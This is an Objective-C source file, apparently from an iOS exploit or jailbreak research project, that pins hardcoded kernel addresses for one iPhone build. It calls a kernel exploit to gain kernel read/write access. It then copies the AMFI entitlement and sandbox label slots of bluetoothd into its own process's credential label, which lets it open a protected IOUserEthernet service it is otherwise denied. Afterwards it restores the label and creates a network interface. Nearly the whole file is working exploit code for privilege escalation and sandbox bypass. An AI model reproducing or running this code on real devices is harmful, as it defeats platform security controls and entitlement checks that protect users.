#import "CNDPhysicalIOUserEthernetSignerProbe.h"

#import <IOKit/IOCFSerialize.h>
#import <IOKit/IOKitLib.h>

#include <errno.h>
#include <dlfcn.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <unistd.h>

enum {
    CNDPhysicalSignerLabelSize = 0x20,
    CNDPhysicalSignerAMFISlotOffset = 0x8,
    CNDPhysicalSignerSandboxSlotOffset = 0x10,
    CNDPhysicalSignerIOMachPortObjectOffset = 0x20,
    CNDPhysicalSignerInterfaceIfnetOffset = 0x90,
    CNDPhysicalSignerIfnetX0Offset = 0x90,
    CNDPhysicalSignerIfnetTargetOffset = 0xb0,
    CNDPhysicalSignerIfnetCheckMultiOffset = 0x238,
};

#define CND_PHYSICAL_SIGNER_EXPECTED_PRODUCT "iPhone17,2"
#define CND_PHYSICAL_SIGNER_EXPECTED_BUILD "23A341"
#define CND_PHYSICAL_SIGNER_OBJECT_MIN UINT64_C(0xffffffdc00000000)
#define CND_PHYSICAL_SIGNER_OBJECT_MAX UINT64_C(0xfffffffbffffffff)

/* Exact iPhone17,2 / 23A341 addresses, independently recovered in Ghidra. */
static const uint64_t CNDPhysicalSignerStaticKernelBase =
    UINT64_C(0xfffffff007004000);
static const uint64_t CNDPhysicalSignerStaticCheckMultiGOT =
    UINT64_C(0xfffffff0080b4020);
static const uint64_t CNDPhysicalSignerStaticLoadW0FromX0 =
    UINT64_C(0xfffffff00826a470);
static const uint64_t CNDPhysicalSignerStaticInitIfnetParams =
    UINT64_C(0xfffffff00a6da548);
static const uint64_t CNDPhysicalSignerStaticCheckMultiSigner =
    UINT64_C(0xfffffff00a6da700);
static const uint64_t CNDPhysicalSignerStaticX0Dispatcher =
    UINT64_C(0xfffffff00a6e759c);

typedef uint64_t (*CNDPhysicalSignerProcFindByNameFn)(const char *name);
typedef uint64_t (*CNDPhysicalSignerProcSelfFn)(void);
typedef uint64_t (*CNDPhysicalSignerProcGetCredLabelFn)(uint64_t proc);
typedef void (*CNDPhysicalSignerKReadBufFn)(uint64_t address, void *buffer,
    uint64_t length);
typedef uint64_t (*CNDPhysicalSignerKRead64Fn)(uint64_t address);
typedef void (*CNDPhysicalSignerKWrite64Fn)(uint64_t address,
    uint64_t value);
typedef bool (*CNDPhysicalSignerKWrite32BytesCheckedFn)(uint64_t address,
    const uint8_t bytes[CNDPhysicalSignerLabelSize]);
typedef int (*CNDPhysicalSignerKexploitFn)(void);
typedef bool (*CNDPhysicalSignerKRWReadyFn)(void);
typedef bool (*CNDPhysicalSignerKRWCleanupFn)(void);
typedef uint64_t (*CNDPhysicalSignerProcTaskFn)(uint64_t proc);
typedef uint64_t (*CNDPhysicalSignerTaskGetKobjectFn)(uint64_t task,
    mach_port_t port);

typedef CFMutableDictionaryRef (*CNDPhysicalSignerServiceMatchingFn)(
    const char *name);
typedef io_service_t (*CNDPhysicalSignerGetMatchingServiceFn)(
    mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*CNDPhysicalSignerGetMatchingServicesFn)(
    mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *iterator);
typedef io_object_t (*CNDPhysicalSignerIteratorNextFn)(io_iterator_t iterator);
typedef kern_return_t (*CNDPhysicalSignerObjectReleaseFn)(io_object_t object);
typedef kern_return_t (*CNDPhysicalSignerServiceOpenFn)(io_service_t service,
    task_port_t owningTask, uint32_t type, io_connect_t *connection);
typedef kern_return_t (*CNDPhysicalSignerServiceCloseFn)(
    io_connect_t connection);
typedef kern_return_t (*CNDPhysicalSignerConnectCallMethodFn)(
    mach_port_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCount,
    const void *inputStruct, size_t inputStructCount,
    uint64_t *output, uint32_t *outputCount,
    void *outputStruct, size_t *outputStructCount);
typedef kern_return_t (*CNDPhysicalSignerRegistryIDFn)(
    io_registry_entry_t entry, uint64_t *entryID);
typedef CFTypeRef (*CNDPhysicalSignerRegistryPropertyFn)(
    io_registry_entry_t entry, CFStringRef key,
    CFAllocatorRef allocator, IOOptionBits options);
typedef kern_return_t (*CNDPhysicalSignerRegistryPathFn)(
    io_registry_entry_t entry, const io_name_t plane, io_string_t path);
typedef CFDataRef (*CNDPhysicalSignerSerializeFn)(
    CFTypeRef object, CFOptionFlags options);

typedef struct {
    CNDPhysicalSignerProcFindByNameFn procFindByName;
    CNDPhysicalSignerProcSelfFn procSelf;
    CNDPhysicalSignerProcGetCredLabelFn procGetCredLabel;
    CNDPhysicalSignerKReadBufFn kreadbuf;
    CNDPhysicalSignerKRead64Fn kread64;
    CNDPhysicalSignerKWrite64Fn kwrite64;
    CNDPhysicalSignerKWrite32BytesCheckedFn write32BytesChecked;
    CNDPhysicalSignerKexploitFn kexploit;
    CNDPhysicalSignerKRWReadyFn krwReady;
    CNDPhysicalSignerKRWCleanupFn krwCleanup;
    CNDPhysicalSignerProcTaskFn procTask;
    CNDPhysicalSignerTaskGetKobjectFn taskGetKobject;
    uint64_t *kernelSlide;
    uint32_t *amfiSlotOffset;
    uint32_t *sandboxSlotOffset;
} CNDPhysicalSignerKernelAPI;

typedef struct {
    void *handle;
    CNDPhysicalSignerServiceMatchingFn serviceMatching;
    CNDPhysicalSignerGetMatchingServiceFn getMatchingService;
    CNDPhysicalSignerGetMatchingServicesFn getMatchingServices;
    CNDPhysicalSignerIteratorNextFn iteratorNext;
    CNDPhysicalSignerObjectReleaseFn objectRelease;
    CNDPhysicalSignerServiceOpenFn serviceOpen;
    CNDPhysicalSignerServiceCloseFn serviceClose;
    CNDPhysicalSignerConnectCallMethodFn connectCallMethod;
    CNDPhysicalSignerRegistryIDFn registryID;
    CNDPhysicalSignerRegistryPropertyFn registryProperty;
    CNDPhysicalSignerRegistryPathFn registryPath;
    CNDPhysicalSignerSerializeFn serialize;
} CNDPhysicalSignerIOKitAPI;

typedef struct {
    uint64_t targetLabel;
    uint64_t donorLabel;
    uint64_t originalAMFIObject;
    uint64_t donorAMFIObject;
    uint64_t originalSandboxObject;
    uint64_t donorSandboxObject;
    uint8_t originalLabel[CNDPhysicalSignerLabelSize];
    uint8_t borrowedLabel[CNDPhysicalSignerLabelSize];
    bool captured;
    bool writeAttempted;
    bool installed;
    bool restored;
} CNDPhysicalSignerBorrow;

typedef struct {
    char bsdName[IFNAMSIZ];
    uint64_t registryID;
    uint64_t interfaceObject;
    uint64_t backingIfnet;
    uint64_t signedCallback;
    uint64_t callbackTarget;
    uint64_t controllerCookie;
    kern_return_t callKR;
    int readbackResult;
} CNDPhysicalSignerSignedInterface;

static volatile int32_t gCNDPhysicalSignerProbeRunning;

static NSString *CNDPhysicalSignerHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDPhysicalSignerSysctlString(const char *name)
{
    char value[128] = {0};
    size_t size = sizeof(value);
    if (sysctlbyname(name, value, &size, NULL, 0) != 0 || value[0] == '\0') {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static bool CNDPhysicalSignerKernelObject(uint64_t value)
{
    return value >= CND_PHYSICAL_SIGNER_OBJECT_MIN &&
        value <= CND_PHYSICAL_SIGNER_OBJECT_MAX &&
        (value & UINT64_C(0x7)) == 0;
}

static void CNDPhysicalSignerPersist(
    NSMutableDictionary<NSString *, id> *report, NSString *path,
    NSString *key, id value)
{
    if (key != nil && value != nil) report[key] = value;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    if (data != nil && path != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
    if (key != nil) {
        NSLog(@"[CND_IOUSERETHERNET_SIGNER] %@=%@", key, value);
    }
}

static bool CNDPhysicalSignerResolveKernelAPI(
    CNDPhysicalSignerKernelAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
#define CND_SIGNER_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_SIGNER_RESOLVE(procFindByName, "proc_find_by_name");
    CND_SIGNER_RESOLVE(procSelf, "proc_self");
    CND_SIGNER_RESOLVE(procGetCredLabel, "proc_get_cred_label");
    CND_SIGNER_RESOLVE(kreadbuf, "kreadbuf");
    CND_SIGNER_RESOLVE(write32BytesChecked,
        "kexploit_early_kwrite32bytes_checked");
    CND_SIGNER_RESOLVE(kexploit, "kexploit_opa334");
    CND_SIGNER_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_SIGNER_RESOLVE(krwCleanup, "kexploit_terminal_cleanup");
    CND_SIGNER_RESOLVE(amfiSlotOffset, "off_label_l_perpolicy_amfi");
    CND_SIGNER_RESOLVE(sandboxSlotOffset,
        "off_label_l_perpolicy_sandbox");
#undef CND_SIGNER_RESOLVE
    return api->procFindByName != NULL && api->procSelf != NULL &&
        api->procGetCredLabel != NULL && api->kreadbuf != NULL &&
        api->write32BytesChecked != NULL && api->kexploit != NULL &&
        api->krwReady != NULL && api->krwCleanup != NULL &&
        api->amfiSlotOffset != NULL && api->sandboxSlotOffset != NULL;
}

static bool CNDPhysicalSignerResolveIOKitAPI(CNDPhysicalSignerIOKitAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->handle = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_NOW | RTLD_LOCAL);
    if (api->handle == NULL) return false;
#define CND_SIGNER_IOKIT_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(api->handle, name)
    CND_SIGNER_IOKIT_RESOLVE(serviceMatching, "IOServiceMatching");
    CND_SIGNER_IOKIT_RESOLVE(getMatchingService,
        "IOServiceGetMatchingService");
    CND_SIGNER_IOKIT_RESOLVE(getMatchingServices,
        "IOServiceGetMatchingServices");
    CND_SIGNER_IOKIT_RESOLVE(iteratorNext, "IOIteratorNext");
    CND_SIGNER_IOKIT_RESOLVE(objectRelease, "IOObjectRelease");
    CND_SIGNER_IOKIT_RESOLVE(serviceOpen, "IOServiceOpen");
    CND_SIGNER_IOKIT_RESOLVE(serviceClose, "IOServiceClose");
    CND_SIGNER_IOKIT_RESOLVE(connectCallMethod, "IOConnectCallMethod");
    CND_SIGNER_IOKIT_RESOLVE(registryID,
        "IORegistryEntryGetRegistryEntryID");
    CND_SIGNER_IOKIT_RESOLVE(registryProperty,
        "IORegistryEntryCreateCFProperty");
    CND_SIGNER_IOKIT_RESOLVE(registryPath, "IORegistryEntryGetPath");
    CND_SIGNER_IOKIT_RESOLVE(serialize, "IOCFSerialize");
#undef CND_SIGNER_IOKIT_RESOLVE
    return api->serviceMatching != NULL &&
        api->getMatchingService != NULL &&
        api->getMatchingServices != NULL && api->iteratorNext != NULL &&
        api->objectRelease != NULL && api->serviceOpen != NULL &&
        api->serviceClose != NULL && api->connectCallMethod != NULL &&
        api->registryID != NULL && api->registryProperty != NULL &&
        api->registryPath != NULL && api->serialize != NULL;
}

static NSArray<NSDictionary<NSString *, id> *> *CNDPhysicalSignerInterfaces(
    const CNDPhysicalSignerIOKitAPI *api)
{
    NSMutableArray<NSDictionary<NSString *, id> *> *result =
        [NSMutableArray array];
    if (api == NULL) return result;
    CFMutableDictionaryRef matching =
        api->serviceMatching("IOUserEthernetInterface");
    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = matching != NULL
        ? api->getMatchingServices(MACH_PORT_NULL, matching, &iterator)
        : KERN_RESOURCE_SHORTAGE;
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) return result;
    for (;;) {
        io_service_t service = api->iteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        uint64_t registryID = 0;
        (void)api->registryID(service, &registryID);
        CFTypeRef bsdName = api->registryProperty(
            service, CFSTR("BSD Name"), kCFAllocatorDefault, 0);
        io_string_t path = {0};
        kern_return_t pathKR = api->registryPath(
            service, kIOServicePlane, path);
        NSMutableDictionary<NSString *, id> *entry =
            [NSMutableDictionary dictionaryWithDictionary:@{
                @"registryID": CNDPhysicalSignerHex(registryID),
                @"path": pathKR == KERN_SUCCESS
                    ? [NSString stringWithUTF8String:path] : @"",
            }];
        if (bsdName != NULL) {
            if (CFGetTypeID(bsdName) == CFStringGetTypeID()) {
                entry[@"bsdName"] = (__bridge NSString *)bsdName;
            }
            CFRelease(bsdName);
        }
        [result addObject:entry];
        (void)api->objectRelease(service);
    }
    (void)api->objectRelease(iterator);
    return result;
}

static bool CNDPhysicalSignerReadLabel(
    const CNDPhysicalSignerKernelAPI *api, uint64_t label,
    uint8_t bytes[CNDPhysicalSignerLabelSize])
{
    if (api == NULL || api->kreadbuf == NULL || bytes == NULL ||
        !CNDPhysicalSignerKernelObject(label)) return false;
    memset(bytes, 0, CNDPhysicalSignerLabelSize);
    api->kreadbuf(label, bytes, CNDPhysicalSignerLabelSize);
    return true;
}

static bool CNDPhysicalSignerWriteAndVerifyLabel(
    const CNDPhysicalSignerKernelAPI *api, uint64_t label,
    const uint8_t desired[CNDPhysicalSignerLabelSize])
{
    if (api == NULL || api->write32BytesChecked == NULL || desired == NULL ||
        !CNDPhysicalSignerKernelObject(label) ||
        !api->write32BytesChecked(label, desired)) return false;
    uint8_t observed[CNDPhysicalSignerLabelSize] = {0};
    return CNDPhysicalSignerReadLabel(api, label, observed) &&
        memcmp(observed, desired, sizeof(observed)) == 0;
}

static bool CNDPhysicalSignerRestore(
    const CNDPhysicalSignerKernelAPI *api, CNDPhysicalSignerBorrow *borrow)
{
    if (api == NULL || borrow == NULL || !borrow->captured ||
        !borrow->writeAttempted) return false;
    uint8_t current[CNDPhysicalSignerLabelSize] = {0};
    if (CNDPhysicalSignerReadLabel(api, borrow->targetLabel, current) &&
        memcmp(current, borrow->originalLabel, sizeof(current)) == 0) {
        borrow->restored = true;
    }
    for (unsigned int attempt = 0;
         !borrow->restored && attempt < 3; attempt++) {
        borrow->restored = CNDPhysicalSignerWriteAndVerifyLabel(
            api, borrow->targetLabel, borrow->originalLabel);
    }
    memset(current, 0, sizeof(current));
    bool finalExact = CNDPhysicalSignerReadLabel(
        api, borrow->targetLabel, current) &&
        memcmp(current, borrow->originalLabel, sizeof(current)) == 0;
    borrow->restored = borrow->restored && finalExact;
    return borrow->restored;
}

static bool CNDPhysicalSignerPrepareBorrow(
    const CNDPhysicalSignerKernelAPI *api, uint64_t donorProc,
    uint64_t targetProc, CNDPhysicalSignerBorrow *borrow)
{
    if (api == NULL || borrow == NULL || donorProc == targetProc ||
        !CNDPhysicalSignerKernelObject(donorProc) ||
        !CNDPhysicalSignerKernelObject(targetProc) ||
        *api->amfiSlotOffset != CNDPhysicalSignerAMFISlotOffset ||
        *api->sandboxSlotOffset != CNDPhysicalSignerSandboxSlotOffset) {
        return false;
    }
    memset(borrow, 0, sizeof(*borrow));
    borrow->donorLabel = api->procGetCredLabel(donorProc);
    borrow->targetLabel = api->procGetCredLabel(targetProc);
    if (!CNDPhysicalSignerKernelObject(borrow->donorLabel) ||
        !CNDPhysicalSignerKernelObject(borrow->targetLabel) ||
        borrow->donorLabel == borrow->targetLabel) return false;

    uint8_t donorBytes[CNDPhysicalSignerLabelSize] = {0};
    borrow->captured = CNDPhysicalSignerReadLabel(
        api, borrow->targetLabel, borrow->originalLabel) &&
        CNDPhysicalSignerReadLabel(api, borrow->donorLabel, donorBytes);
    if (!borrow->captured) return false;
    memcpy(&borrow->originalAMFIObject,
        borrow->originalLabel + CNDPhysicalSignerAMFISlotOffset,
        sizeof(borrow->originalAMFIObject));
    memcpy(&borrow->donorAMFIObject,
        donorBytes + CNDPhysicalSignerAMFISlotOffset,
        sizeof(borrow->donorAMFIObject));
    memcpy(&borrow->originalSandboxObject,
        borrow->originalLabel + CNDPhysicalSignerSandboxSlotOffset,
        sizeof(borrow->originalSandboxObject));
    memcpy(&borrow->donorSandboxObject,
        donorBytes + CNDPhysicalSignerSandboxSlotOffset,
        sizeof(borrow->donorSandboxObject));
    if (!CNDPhysicalSignerKernelObject(borrow->originalAMFIObject) ||
        !CNDPhysicalSignerKernelObject(borrow->donorAMFIObject) ||
        !CNDPhysicalSignerKernelObject(borrow->originalSandboxObject) ||
        !CNDPhysicalSignerKernelObject(borrow->donorSandboxObject) ||
        borrow->originalAMFIObject == borrow->donorAMFIObject ||
        borrow->originalSandboxObject == borrow->donorSandboxObject) {
        return false;
    }

    memcpy(borrow->borrowedLabel, borrow->originalLabel,
        sizeof(borrow->borrowedLabel));
    memcpy(borrow->borrowedLabel + CNDPhysicalSignerAMFISlotOffset,
        &borrow->donorAMFIObject, sizeof(borrow->donorAMFIObject));
    memcpy(borrow->borrowedLabel + CNDPhysicalSignerSandboxSlotOffset,
        &borrow->donorSandboxObject, sizeof(borrow->donorSandboxObject));
    borrow->writeAttempted = true;
    borrow->installed = CNDPhysicalSignerWriteAndVerifyLabel(
        api, borrow->targetLabel, borrow->borrowedLabel);
    if (!borrow->installed) (void)CNDPhysicalSignerRestore(api, borrow);
    return borrow->installed;
}

static NSDictionary<NSString *, id> *CNDPhysicalSignerRunOnce(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *reportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalIOUserEthernetSignerProbe.json"];
    NSMutableDictionary<NSString *, id> *report =
        [@{
            @"schema":
                @"com.zeroxjf.cyanide.physical-iouserethernet-signer-probe",
            @"schemaVersion": @1,
            @"productType": CNDPhysicalSignerSysctlString("hw.machine"),
            @"productBuildVersion":
                CNDPhysicalSignerSysctlString("kern.osversion"),
            @"donorProcess": @"bluetoothd",
            @"requiredEntitlement":
                @"com.apple.networking.ethernet.user-access",
            @"kernelCallUsed": @NO,
            @"kernelReadUsed": @YES,
            @"kernelWriteUsed": @NO,
            @"borrowedPolicies": @[
                @"AMFI OSEntitlements @ label+0x8",
                @"Seatbelt sandbox @ label+0x10",
            ],
            @"labelWriteScope":
                @"self MAC label base, exactly 0x20 physical bytes",
            @"reportPath": reportPath,
            @"state": @"starting",
        } mutableCopy];
    CNDPhysicalSignerPersist(report, reportPath, nil, nil);

    NSString *product = report[@"productType"];
    NSString *build = report[@"productBuildVersion"];
    if (![product isEqualToString:@CND_PHYSICAL_SIGNER_EXPECTED_PRODUCT] ||
        ![build isEqualToString:@CND_PHYSICAL_SIGNER_EXPECTED_BUILD]) {
        CNDPhysicalSignerPersist(
            report, reportPath, @"result", @"refused-unsupported-device");
        return report;
    }

    CNDPhysicalSignerKernelAPI kernel = {0};
    CNDPhysicalSignerIOKitAPI iokit = {0};
    if (!CNDPhysicalSignerResolveKernelAPI(&kernel) ||
        !CNDPhysicalSignerResolveIOKitAPI(&iokit)) {
        CNDPhysicalSignerPersist(
            report, reportPath, @"result", @"refused-api-unavailable");
        if (iokit.handle != NULL) dlclose(iokit.handle);
        return report;
    }

    bool initiallyReady = kernel.krwReady();
    report[@"krwInitiallyReady"] = @(initiallyReady);
    bool acquired = false;
    if (!initiallyReady) {
        CNDPhysicalSignerPersist(
            report, reportPath, @"state", @"acquiring-physical-krw");
        int exploitResult = kernel.kexploit();
        report[@"kexploitResult"] = @(exploitResult);
        acquired = true;
    }
    bool ready = kernel.krwReady();
    report[@"krwValidated"] = @(ready);
    if (!ready) {
        CNDPhysicalSignerPersist(
            report, reportPath, @"result", @"refused-krw-not-ready");
        dlclose(iokit.handle);
        return report;
    }

    NSArray *before = CNDPhysicalSignerInterfaces(&iokit);
    io_service_t resource = iokit.getMatchingService(
        MACH_PORT_NULL, iokit.serviceMatching("IOUserEthernetResource"));
    io_connect_t baselineConnection = IO_OBJECT_NULL;
    kern_return_t baselineOpenKR = MACH_PORT_VALID(resource)
        ? iokit.serviceOpen(resource, mach_task_self(), 0,
            &baselineConnection)
        : KERN_NOT_FOUND;
    if (MACH_PORT_VALID(baselineConnection)) {
        (void)iokit.serviceClose(baselineConnection);
    }
    report[@"baselineOpenKR"] = CNDPhysicalSignerHex(
        (uint32_t)baselineOpenKR);
    if (!MACH_PORT_VALID(resource) || baselineOpenKR == KERN_SUCCESS) {
        if (MACH_PORT_VALID(resource)) (void)iokit.objectRelease(resource);
        CNDPhysicalSignerPersist(report, reportPath, @"result",
            baselineOpenKR == KERN_SUCCESS
                ? @"baseline-unexpectedly-authorized" : @"resource-missing");
        if (acquired) report[@"krwTerminalCleanupParked"] =
            @(kernel.krwCleanup());
        dlclose(iokit.handle);
        return report;
    }

    /* Resolve both labels only after the negative open has completed. */
    uint64_t targetProc = kernel.procSelf();
    uint64_t donorProc = kernel.procFindByName("bluetoothd");
    report[@"targetProc"] = CNDPhysicalSignerHex(targetProc);
    report[@"donorProc"] = CNDPhysicalSignerHex(donorProc);
    report[@"labelResolvedAfterBaseline"] = @YES;
    CNDPhysicalSignerBorrow borrow = {0};
    bool installed = CNDPhysicalSignerPrepareBorrow(
        &kernel, donorProc, targetProc, &borrow);
    report[@"targetLabel"] = CNDPhysicalSignerHex(borrow.targetLabel);
    report[@"donorLabel"] = CNDPhysicalSignerHex(borrow.donorLabel);
    report[@"originalAMFIObject"] =
        CNDPhysicalSignerHex(borrow.originalAMFIObject);
    report[@"donorAMFIObject"] =
        CNDPhysicalSignerHex(borrow.donorAMFIObject);
    report[@"originalSandboxObject"] =
        CNDPhysicalSignerHex(borrow.originalSandboxObject);
    report[@"donorSandboxObject"] =
        CNDPhysicalSignerHex(borrow.donorSandboxObject);
    report[@"kernelWriteUsed"] = @(borrow.writeAttempted);
    CNDPhysicalSignerPersist(
        report, reportPath, @"borrowInstalled", @(installed));
    if (!installed) {
        report[@"borrowRestored"] = @(borrow.restored);
        (void)iokit.objectRelease(resource);
        CNDPhysicalSignerPersist(report, reportPath, @"result",
            borrow.writeAttempted && !borrow.restored
                ? @"critical-label-restore-failed"
                : @"refused-label-borrow");
        if (acquired && borrow.restored) report[@"krwTerminalCleanupParked"] =
            @(kernel.krwCleanup());
        dlclose(iokit.handle);
        return report;
    }

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t borrowedOpenKR = iokit.serviceOpen(
        resource, mach_task_self(), 0, &connection);
    bool restored = CNDPhysicalSignerRestore(&kernel, &borrow);
    report[@"borrowedOpenKR"] = CNDPhysicalSignerHex(
        (uint32_t)borrowedOpenKR);
    report[@"borrowRestored"] = @(restored);
    report[@"restoreWholeLabelExact"] = @(restored);
    CNDPhysicalSignerPersist(report, reportPath, @"state",
        restored ? @"label-restored-before-selector"
                 : @"critical-label-restore-failed");
    (void)iokit.objectRelease(resource);
    if (!restored) {
        if (MACH_PORT_VALID(connection)) (void)iokit.serviceClose(connection);
        CNDPhysicalSignerPersist(report, reportPath, @"result",
            @"critical-label-restore-failed");
        dlclose(iokit.handle);
        return report;
    }

    kern_return_t callKR = KERN_FAILURE;
    uint64_t controllerCookie = 0;
    uint32_t scalarOutputCount = 1;
    CFDataRef serialized = NULL;
    if (borrowedOpenKR == KERN_SUCCESS && MACH_PORT_VALID(connection)) {
        uint8_t mac[6] = {
            0x02, 0xc0, 0xde, 0x26,
            (uint8_t)((uint32_t)getpid() >> 8),
            (uint8_t)(uint32_t)getpid(),
        };
        NSDictionary *properties = @{
            @"HardwareAddress": [NSData dataWithBytes:mac length:6],
            @"MinPacketSize": @64,
            @"MaxPacketSize": @1514,
            @"MaxTransferUnit": @1500,
            @"NamePrefix": @"cnd",
        };
        serialized = iokit.serialize(
            (__bridge CFTypeRef)properties, kIOCFSerializeToBinary);
        if (serialized != NULL) {
            report[@"selectorInvokedAfterRestore"] = @YES;
            callKR = iokit.connectCallMethod(
                connection, 0, NULL, 0,
                CFDataGetBytePtr(serialized),
                (size_t)CFDataGetLength(serialized),
                &controllerCookie, &scalarOutputCount, NULL, NULL);
        }
    }
    report[@"callKR"] = CNDPhysicalSignerHex((uint32_t)callKR);
    report[@"controllerCookie"] =
        CNDPhysicalSignerHex(controllerCookie);
    if (callKR == KERN_SUCCESS) usleep(500000);
    NSArray *after = CNDPhysicalSignerInterfaces(&iokit);
    NSMutableSet<NSString *> *beforeIDs = [NSMutableSet set];
    for (NSDictionary *entry in before) {
        NSString *identifier = entry[@"registryID"];
        if (identifier != nil) [beforeIDs addObject:identifier];
    }
    NSMutableArray *created = [NSMutableArray array];
    for (NSDictionary *entry in after) {
        if (![beforeIDs containsObject:entry[@"registryID"]]) {
            [created addObject:entry];
        }
    }
    report[@"interfacesBefore"] = before;
    report[@"interfacesAfter"] = after;
    report[@"createdInterfaces"] = created;
    bool success = baselineOpenKR != KERN_SUCCESS && installed &&
        borrowedOpenKR == KERN_SUCCESS && restored &&
        callKR == KERN_SUCCESS && created.count != 0;
    CNDPhysicalSignerPersist(report, reportPath, @"result", success
        ? @"physical-krw-triggered-normal-signer-path"
        : @"trigger-failed");

    if (serialized != NULL) CFRelease(serialized);
    if (MACH_PORT_VALID(connection)) (void)iokit.serviceClose(connection);
    if (acquired) {
        report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        CNDPhysicalSignerPersist(report, reportPath, nil, nil);
    } else {
        report[@"krwLeftOpenBecausePreexisting"] = @YES;
        CNDPhysicalSignerPersist(report, reportPath, nil, nil);
    }
    dlclose(iokit.handle);
    return report;
}

BOOL CNDPhysicalIOUserEthernetSignerProbeIsSupported(NSString **reasonOut)
{
    NSString *product = CNDPhysicalSignerSysctlString("hw.machine");
    NSString *build = CNDPhysicalSignerSysctlString("kern.osversion");
    BOOL supported =
        [product isEqualToString:@CND_PHYSICAL_SIGNER_EXPECTED_PRODUCT] &&
        [build isEqualToString:@CND_PHYSICAL_SIGNER_EXPECTED_BUILD];
    if (reasonOut != NULL) {
        *reasonOut = supported
            ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 / 23A341; observed %@ / %@.",
                product.length ? product : @"unknown",
                build.length ? build : @"unknown"];
    }
    return supported;
}

BOOL CNDPhysicalIOUserEthernetSignerProbeIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDPhysicalSignerProbeRunning, 0) != 0;
}

void CNDPhysicalIOUserEthernetSignerProbeRun(
    CNDPhysicalIOUserEthernetSignerProbeCompletion completion)
{
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalSignerProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical signer probe is already running.",
            });
        });
        return;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalSignerRunOnce();
        __sync_lock_release(&gCNDPhysicalSignerProbeRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
